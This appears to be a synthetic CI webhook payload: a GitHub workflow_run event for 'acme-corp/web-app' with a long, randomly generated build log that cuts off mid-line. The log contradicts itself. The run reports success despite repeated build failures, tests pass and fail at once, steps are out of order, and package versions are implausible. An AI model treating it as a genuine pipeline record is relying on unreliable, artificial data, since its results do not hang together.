{
  "action": "completed",
  "workflow_run": {
    "id": 83,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "baeccf4364fb3dd78ea20398bddf09d3b1807f26",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-04T12:00:19.122280Z",
    "updated_at": "2025-12-04T12:04:16.924848Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: unit_tests ===\n  PASS: test_cache_hit (182ms)\nInstalling webpack@5.1.0\nInstalling lodash@4.5.0\nInstalling react@2.1.0\nCache hit for key-3323\n  PASS: test_cache_hit (15ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\nInstalling prettier@2.4.0\nInstalling lodash@5.11.0\n[12:00:19] INFO: Processing request\nInstalling eslint@4.8.0\n[12:00:19] INFO: Processing request\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling eslint@2.12.0\nInstalling eslint@1.11.0\nStep 5/10: Building\nStep 2/10: Building\nCompiling src/index.js...\nCache hit for key-6157\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 lint completed\nInstalling jest@5.7.0\n  PASS: test_cache_hit (441ms)\nCompiling src/service.java...\n\u2713 test completed\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (32MB)\nStep 5/10: Building\nCompiling src/service.java...\nStep 10/10: Building\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (429ms)\nCompiling src/app.ts...\nStep 1/10: Building\nStep 2/10: Building\n  PASS: test_auth_login (321ms)\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/main.py...\n  PASS: test_cache_hit (14ms)\n[12:00:19] INFO: Processing request\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-3489\n\u2713 build completed\n\u2713 lint completed\nWARNING: jest has known vulnerabilities\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_api_health (201ms)\n[12:00:19] INFO: Processing request\nInstalling axios@5.8.0\nInstalling axios@5.3.0\nCache hit for key-3772\nWARNING: express has known vulnerabilities\nCompiling src/app.ts...\nCache hit for key-5838\n\u2713 build completed\nCompiling src/index.js...\nInstalling react@1.3.0\n[12:00:19] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_user_create (346ms)\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nCompiling src/app.ts...\nWARNING: lodash has known vulnerabilities\nCompiling src/index.js...\nStep 7/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (19MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_db_connect (376ms)\nCache hit for key-8268\n[12:00:19] WARN: Deprecated API usage\nInstalling jest@2.10.0\nStep 1/10: Building\nStep 2/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:19] WARN: Deprecated API usage\n  PASS: test_user_create (1ms)\nArtifact uploaded: build.tar.gz (30MB)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_cache_hit (436ms)\n[12:00:19] INFO: Processing request\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nInstalling express@2.12.0\nCache hit for key-2654\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-5111\n[12:00:19] INFO: Processing request\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (140ms)\nCache hit for key-2376\nCompiling src/main.py...\n  PASS: test_user_create (81ms)\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\nStep 2/10: Building\nStep 6/10: Building\n  PASS: test_db_connect (335ms)\nInstalling prettier@3.4.0\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-2169\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nStep 10/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:19] INFO: Processing request\nStep 9/10: Building\n\u2713 build completed\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2713 build completed\n[12:00:19] INFO: Processing request\n\u2713 test completed\nCache hit for key-1599\nFAILED: test_cache_hit\n[12:00:19] ERROR: Connection failed\nCache hit for key-5703\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:19] INFO: Processing request\n[12:00:19] ERROR: Connection failed\nFAILED: test_api_health\nStep 2/10: Building\nCompiling src/handler.rs...\nStep 8/10: Building\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 test completed\nStep 8/10: Building\n\u2717 build failed with exit code 93\nCache hit for key-4324\n=== Step unit_tests completed ===\n=== Step: lint ===\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\nCache hit for key-9338\nException: NullPointerException\nCache hit for key-2635\n[12:00:19] INFO: Processing request\nCompiling src/handler.rs...\nException: RuntimeError\nInstalling lodash@4.3.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:19] INFO: Processing request\n\u2713 build completed\n  PASS: test_cache_hit (213ms)\n  PASS: test_user_create (350ms)\n[12:00:19] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_api_health (218ms)\nCache hit for key-7565\n[12:00:19] INFO: Processing request\nInstalling axios@3.6.0\n  PASS: test_user_create (299ms)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-6332\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_auth_login (466ms)\n  PASS: test_api_health (279ms)\n  PASS: test_api_health (280ms)\n  PASS: test_user_create (95ms)\n  PASS: test_cache_hit (341ms)\nCache hit for key-4929\nInstalling express@2.14.0\nCache hit for key-7237\n[12:00:19] INFO: Processing request\nCache hit for key-5736\n\u2713 lint completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\nInstalling express@3.12.0\nStep 4/10: Building\n  PASS: test_db_connect (5ms)\nCache hit for key-7889\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/index.js...\n\u2713 lint completed\nInstalling axios@5.15.0\n\u2713 build completed\nCache hit for key-9224\nCompiling src/main.py...\nStep 3/10: Building\nFAILED: test_user_create\nWARNING: express has known vulnerabilities\n\u2713 build completed\nCache hit for key-3796\nStep 4/10: Building\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-4918\nFAILED: test_api_health\nStep 4/10: Building\nCache hit for key-4034\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-6021\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-9906\nStep 1/10: Building\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-3159\n\u2713 build completed\nStep 9/10: Building\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (437ms)\nInstalling axios@3.9.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling lodash@4.17.0\nInstalling eslint@5.8.0\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 build completed\n\u2713 build completed\nException: NullPointerException\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nCache hit for key-2241\n\u2713 test completed\n  PASS: test_db_connect (100ms)\nInstalling express@2.15.0\n  PASS: test_cache_hit (1ms)\n  PASS: test_db_connect (104ms)\n[12:00:19] INFO: Processing request\nStep 3/10: Building\nCache hit for key-3769\n\u2713 test completed\nWARNING: axios has known vulnerabilities\nCompiling src/handler.rs...\nCache hit for key-2298\n  PASS: test_auth_login (298ms)\n\u2713 lint completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 6/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\nCache hit for key-8662\n  PASS: test_user_create (478ms)\nStep 8/10: Building\n  PASS: test_api_health (123ms)\n[12:00:19] INFO: Processing request\n\u2713 build completed\n\u2713 lint completed\nStep 3/10: Building\nCache hit for key-1222\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (317ms)\n[12:00:19] INFO: Processing request\n  PASS: test_cache_hit (77ms)\nCache hit for key-8180\nCache hit for key-9031\n  PASS: test_user_create (231ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling react@4.15.0\nFAILED: test_api_health\nInstalling react@5.17.0\nInstalling express@3.12.0\nInstalling webpack@3.7.0\nCache hit for key-3721\nStep 6/10: Building\n  PASS: test_cache_hit (397ms)\n\u2713 build completed\n[12:00:19] INFO: Processing request\nCache hit for key-8583\nArtifact uploaded: build.tar.gz (42MB)\nInstalling lodash@5.18.0\nCache hit for key-7693\nInstalling prettier@2.19.0\nInstalling jest@2.15.0\n\u2717 build failed with exit code 4\n=== Step lint completed ===\n=== Step: deploy_staging ===\nArtifact uploaded: build.tar.gz (8MB)\nStep 1/10: Building\nCache hit for key-2807\nInstalling eslint@2.10.0\nStep 1/10: Building\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\n\u2717 build failed with exit code 103\n  PASS: test_auth_login (181ms)\n\u2713 test completed\nCache hit for key-3968\n  PASS: test_cache_hit (149ms)\nInstalling jest@1.10.0\n[12:00:19] INFO: Processing request\nInstalling webpack@4.8.0\n[12:00:19] WARN: Deprecated API usage\nCompiling src/main.py...\n  PASS: test_api_health (179ms)\nCompiling src/utils.go...\n  PASS: test_api_health (387ms)\nCache hit for key-8951\n  PASS: test_cache_hit (239ms)\n\u2713 lint completed\nStep 3/10: Building\nCache hit for key-7508\nCache hit for key-6328\n[12:00:19] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_db_connect (285ms)\n\u2717 build failed with exit code 111\nInstalling axios@2.1.0\nStep 5/10: Building\nCache hit for key-3858\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-4259\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\nInstalling eslint@2.14.0\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-5065\n  PASS: test_auth_login (319ms)\n[12:00:19] INFO: Processing request\n[12:00:19] ERROR: Connection failed\n[12:00:19] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_api_health (364ms)\nStep 10/10: Building\n\u2713 build completed\nCompiling src/handler.rs...\nStep 1/10: Building\n\u2713 lint completed\nCompiling src/utils.go...\n\u2713 lint completed\n  PASS: test_api_health (386ms)\nCompiling src/main.py...\nCache hit for key-5077\nCompiling src/index.js...\n\u2713 test completed\n\u2713 test completed\nInstalling react@5.11.0\nCompiling src/handler.rs...\n\u2713 test completed\nCompiling src/main.py...\nCache hit for key-9481\nStep 2/10: Building\n[12:00:19] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:19] INFO: Processing request\n  PASS: test_cache_hit (318ms)\nStep 8/10: Building\n  PASS: test_cache_hit (416ms)\n  PASS: test_cache_hit (106ms)\nStep 7/10: Building\n\u2713 test completed\n\u2717 build failed with exit code 83\nCompiling src/service.java...\nCompiling src/handler.rs...\n\u2713 build completed\nCompiling src/main.py...\nWARNING: lodash has known vulnerabilities\nInstalling express@5.5.0\nCompiling src/index.js...\nCache hit for key-7365\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (24MB)\nWARNING: prettier has known vulnerabilities\nInstalling react@2.10.0\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (23MB)\nStep 7/10: Building\n  PASS: test_auth_login (289ms)\nInstalling webpack@5.14.0\nCache hit for key-5045\nCache hit for key-4287\n\u2713 lint completed\n  PASS: test_user_create (481ms)\nStep 6/10: Building\n  PASS: test_db_connect (28ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (17MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:19] INFO: Processing request\nInstalling react@2.20.0\nStep 10/10: Building\nInstalling jest@4.16.0\n[12:00:19] INFO: Processing request\n\u2713 build completed\nCache hit for key-5669\n[12:00:19] WARN: Deprecated API usage\nFAILED: test_user_create\nInstalling lodash@4.20.0\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_auth_login (498ms)\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-8975\nCache hit for key-9737\nInstalling axios@5.10.0\n  PASS: test_auth_login (283ms)\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 lint completed\nInstalling react@3.17.0\nInstalling express@2.1.0\nInstalling eslint@5.17.0\nInstalling prettier@4.19.0\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_auth_login (481ms)\nInstalling express@4.19.0\n[12:00:19] ERROR: Connection failed\n  PASS: test_db_connect (418ms)\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/app.ts...\n  PASS: test_db_connect (309ms)\n\u2713 build completed\n  PASS: test_cache_hit (362ms)\nCompiling src/utils.go...\n=== Step deploy_staging completed ===\n=== Step: checkout ===\nInstalling axios@5.14.0\nArtifact uploaded: build.tar.gz (2MB)\nStep 9/10: Building\n[12:00:19] INFO: Processing request\nCompiling src/index.js...\nStep 4/10: Building\nStep 7/10: Building\nCompiling src/app.ts...\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\nCache hit for key-2918\n  PASS: test_db_connect (316ms)\n  PASS: test_db_connect (232ms)\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-3672\nStep 7/10: Building\nCache hit for key-7919\n\u2713 test completed\nCache hit for key-1249\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 build completed\n[12:00:19] ERROR: Connection failed\nStep 9/10: Building\nStep 10/10: Building\n[12:00:19] INFO: Processing request\nCache hit for key-3553\nCompiling src/service.java...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/handler.rs...\n  PASS: test_api_health (196ms)\n[12:00:19] INFO: Processing request\nCache hit for key-5148\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nInstalling express@4.13.0\nCompiling src/handler.rs...\nWARNING: express has known vulnerabilities\n[12:00:19] INFO: Processing request\nCache hit for key-3209\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 lint completed\nInstalling prettier@4.12.0\nCache hit for key-8542\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling react@4.0.0\n  PASS: test_auth_login (374ms)\n  PASS: test_cache_hit (287ms)\n[12:00:19] INFO: Processing request\nStep 10/10: Building\n\u2713 build completed\n  PASS: test_cache_hit (18ms)\nCompiling src/main.py...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/index.js...\n  PASS: test_cache_hit (208ms)\nInstalling prettier@1.14.0\n  PASS: test_api_health (14ms)\nCache hit for key-9643\nCompiling src/service.java...\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/service.java...\n  PASS: test_auth_login (120ms)\n\u2713 build completed\nStep 10/10: Building\nCompiling src/service.java...\n[12:00:19] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 test completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_auth_login (361ms)\nArtifact uploaded: build.tar.gz (48MB)\nInstalling eslint@2.2.0\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (25MB)\nStep 6/10: Building\n\u2713 build completed\nFAILED: test_user_create\nCache hit for key-1051\nInstalling jest@2.0.0\n\u2713 build completed\nInstalling webpack@1.20.0\n  PASS: test_cache_hit (234ms)\n[12:00:19] INFO: Processing request\nStep 2/10: Building\nCompiling src/service.java...\n  PASS: test_api_health (298ms)\nStep 5/10: Building\n\u2717 build failed with exit code 57\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\nCache hit for key-7985\n[12:00:19] INFO: Processing request\nInstalling react@2.13.0\n[12:00:19] INFO: Processing request\nStep 7/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (33MB)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nInstalling lodash@4.13.0\n  PASS: test_api_health (398ms)\n\u2713 lint completed\n[12:00:19] INFO: Processing request\n\u2713 test completed\n\u2713 lint completed\nCache hit for key-2612\nInstalling prettier@3.17.0\nFAILED: test_api_health\n  PASS: test_db_connect (237ms)\nInstalling express@5.14.0\n  PASS: test_auth_login (337ms)\nArtifact uploaded: build.tar.gz (27MB)\nInstalling prettier@5.14.0\nCache hit for key-8057\nStep 2/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-2560\n[12:00:19] INFO: Processing request\nInstalling prettier@1.3.0\n  PASS: test_cache_hit (265ms)\n\u2713 build completed\nStep 7/10: Building\nCache hit for key-2288\nInstalling lodash@2.5.0\n  PASS: test_db_connect (207ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-3526\nException: TypeError\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-3754\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/main.py...\n=== Step checkout completed ===\n=== Step: upload_artifacts ===\nCache hit for key-6109\nInstalling jest@4.3.0\nInstalling express@5.4.0\nStep 10/10: Building\n  PASS: test_api_health (67ms)\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_api_health (7ms)\nCache hit for key-7063\nInstalling lodash@5.18.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-1005\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:19] INFO: Processing request\n  PASS: test_db_connect (164ms)\nCompiling src/utils.go...\n[12:00:19] WARN: Deprecated API usage\nCompiling src/utils.go...\nFAILED: test_user_create\n\u2713 build completed\n  PASS: test_db_connect (288ms)\nStep 4/10: Building\nInstalling axios@5.20.0\nCompiling src/main.py...\n  PASS: test_auth_login (150ms)\n\u2713 test completed\nCache hit for key-4290\n  PASS: test_cache_hit (477ms)\nCompiling src/utils.go...\n[12:00:19] WARN: Deprecated API usage\n  PASS: test_auth_login (278ms)\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\nCache hit for key-9979\n[12:00:19] WARN: Deprecated API usage\n  PASS: test_db_connect (237ms)\nCache hit for key-1495\nStep 5/10: Building\nCompiling src/app.ts...\nCache hit for key-9746\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (40MB)\nStep 8/10: Building\n\u2713 lint completed\nCache hit for key-6427\nCache hit for key-9878\n\u2713 lint completed\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n\u2713 test completed\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-8218\n\u2713 lint completed\nCache hit for key-6285\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling axios@4.20.0\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 lint completed\nCompiling src/handler.rs...\n[12:00:19] WARN: Deprecated API usage\nInstalling lodash@4.4.0\n\u2713 build completed\n  PASS: test_auth_login (11ms)\nStep 9/10: Building\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\n[12:00:19] INFO: Processing request\nInstalling jest@1.8.0\n  PASS: test_auth_login (154ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (32MB)\n\u2717 build failed with exit code 84\nCompiling src/main.py...\n\u2713 lint completed\nStep 4/10: Building\n  PASS: test_api_health (200ms)\n  PASS: test_db_connect (253ms)\n  PASS: test_cache_hit (62ms)\nStep 6/10: Building\nCache hit for key-4094\nInstalling eslint@5.7.0\nCache hit for key-4785\n\u2713 lint completed\nStep 8/10: Building\nStep 3/10: Building\nCache hit for key-6800\nCompiling src/service.java...\nCache hit for key-3089\n\u2713 build completed\n\u2713 build completed\nStep 7/10: Building\n  PASS: test_db_connect (27ms)\nCache hit for key-2751\nCompiling src/index.js...\nCache hit for key-2053\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\nCache hit for key-7843\nCache hit for key-9481\n\u2713 lint completed\nStep 4/10: Building\nCompiling src/index.js...\nInstalling axios@1.17.0\n\u2713 build completed\nCache hit for key-9819\nStep 3/10: Building\nCache hit for key-7309\nStep 6/10: Building\nWARNING: axios has known vulnerabilities\n  PASS: test_db_connect (58ms)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-4284\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (195ms)\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-6149\n  PASS: test_db_connect (414ms)\nCache hit for key-7469\n\u2713 build completed\nCache hit for key-9112\nCache hit for key-2469\nStep 3/10: Building\nCache hit for key-3920\nCompiling src/main.py...\nWARNING: express has known vulnerabilities\nCache hit for key-1457\nInstalling prettier@3.12.0\n  PASS: test_user_create (422ms)\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_auth_login (458ms)\nInstalling eslint@4.13.0\n\u2713 test completed\nInstalling prettier@2.7.0\nStep 10/10: Building\n  PASS: test_cache_hit (37ms)\nCompiling src/app.ts...\n  PASS: test_cache_hit (80ms)\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:19] INFO: Processing request\nCache hit for key-1243\nWARNING: prettier has known vulnerabilities\nStep 7/10: Building\n\u2713 build completed\n=== Step upload_artifacts completed ===\n=== Step: build ===\nStep 7/10: Building\nCompiling src/index.js...\nCompiling src/index.js...\nException: RuntimeError\nCompiling src/index.js...\n  PASS: test_api_health (189ms)\nStep 3/10: Building\nInstalling express@2.4.0\n\u2713 test completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:19] INFO: Processing request\nCache hit for key-5275\nCompiling src/main.py...\nInstalling lodash@2.10.0\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-1515\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\nCompiling src/app.ts...\n\u2713 lint completed\nWARNING: webpack has known vulnerabilities\nStep 1/10: Building\nCompiling src/main.py...\nInstalling express@5.9.0\nStep 6/10: Building\nStep 6/10: Building\n[12:00:19] WARN: Deprecated API usage\nCompiling src/service.java...\n[12:00:19] WARN: Deprecated API usage\nCompiling src/service.java...\n\u2713 test completed\nCompiling src/service.java...\nStep 8/10: Building\nInstalling webpack@3.19.0\n\u2713 lint completed\n  PASS: test_api_health (329ms)\n\u2713 build completed\n  PASS: test_api_health (40ms)\nCache hit for key-2705\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\nCompiling src/handler.rs...\nCache hit for key-5645\n\u2713 build completed\nInstalling prettier@3.7.0\n\u2713 build completed\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (177ms)\n  PASS: test_user_create (382ms)\nInstalling eslint@1.16.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (9MB)\nInstalling webpack@2.4.0\nCache hit for key-6872\nInstalling webpack@1.8.0\nStep 6/10: Building\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\nStep 3/10: Building\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\n  PASS: test_db_connect (188ms)\nInstalling jest@4.20.0\nInstalling axios@5.5.0\nCache hit for key-6271\nInstalling jest@5.12.0\nWARNING: react has known vulnerabilities\n[12:00:19] INFO: Processing request\n  PASS: test_user_create (278ms)\n[12:00:19] INFO: Processing request\nCache hit for key-2619\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nInstalling lodash@4.15.0\n  PASS: test_auth_login (127ms)\nInstalling webpack@5.0.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 build completed\nCache hit for key-3938\nInstalling lodash@5.9.0\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:19] INFO: Processing request\nCache hit for key-7777\nInstalling react@3.19.0\nWARNING: react has known vulnerabilities\n\u2713 lint completed\nCompiling src/handler.rs...\n\u2713 build completed\n\u2713 test completed\n  PASS: test_db_connect (230ms)\n  PASS: test_db_connect (97ms)\nCache hit for key-6108\nCompiling src/utils.go...\nException: TypeError\n\u2713 build completed\n  PASS: test_user_create (125ms)\nCompiling src/main.py...\nCache hit for key-1369\n\u2713 test completed\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_api_health (369ms)\n  PASS: test_user_create (472ms)\nCache hit for key-6096\n  PASS: test_cache_hit (397ms)\nStep 1/10: Building\nCache hit for key-7647\nCache hit for key-2347\nCompiling src/utils.go...\nStep 4/10: Building\nInstalling jest@3.1.0\n\u2713 test completed\nInstalling webpack@1.14.0\nStep 8/10: Building\nCache hit for key-9881\n[12:00:19] INFO: Processing request\nStep 4/10: Building\nException: RuntimeError\n[12:00:19] WARN: Deprecated API usage\n\u2713 build completed\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nInstalling jest@3.17.0\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/app.ts...\nInstalling express@2.0.0\nInstalling express@3.9.0\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:19] WARN: Deprecated API usage\n\u2717 build failed with exit code 92\nException: RuntimeError\n  PASS: test_db_connect (282ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_db_connect (470ms)\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 build completed\n\u2713 build completed\n[12:00:19] ERROR: Connection failed\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nStep 5/10: Building\nInstalling webpack@4.5.0\n=== Step build completed ===\n=== Step: restore_cache ===\n\u2713 lint completed\nStep 8/10: Building\nException: RuntimeError\nArtifact uploaded: build.tar.gz (46MB)\nStep 8/10: Building\nInstalling lodash@4.8.0\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:19] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-3537\nInstalling eslint@5.14.0\n[12:00:19] INFO: Processing request\nCache hit for key-5722\nCompiling src/main.py...\nCache hit for key-6303\n[12:00:19] WARN: Deprecated API usage\nInstalling jest@5.11.0\n  PASS: test_api_health (484ms)\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (465ms)\n  PASS: test_user_create (40ms)\n  PASS: test_api_health (477ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-1618\n  PASS: test_db_connect (118ms)\nInstalling eslint@3.9.0\nStep 7/10: Building\nCache hit for key-5872\nCache hit for key-8138\nCompiling src/main.py...\nCache hit for key-1722\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-6955\nInstalling jest@4.20.0\nStep 9/10: Building\n  PASS: test_api_health (496ms)\nInstalling lodash@5.3.0\nStep 2/10: Building\nStep 2/10: Building\n[12:00:19] WARN: Deprecated API usage\n\u2713 lint completed\n  PASS: test_db_connect (279ms)\n\u2713 build completed\n  PASS: test_cache_hit (463ms)\n\u2713 lint completed\nCompiling src/service.java...\nFAILED: test_cache_hit\n  PASS: test_cache_hit (216ms)\nStep 5/10: Building\n[12:00:19] INFO: Processing request\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (43MB)\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (7MB)\nInstalling jest@5.6.0\nCompiling src/main.py...\nStep 9/10: Building\n[12:00:19] ERROR: Connection failed\nCache hit for key-1106\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-2032\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\n[12:00:19] INFO: Processing request\nStep 6/10: Building\nCompiling src/app.ts...\nCompiling src/utils.go...\nCompiling src/service.java...\nCache hit for key-2059\nFAILED: test_cache_hit\nInstalling 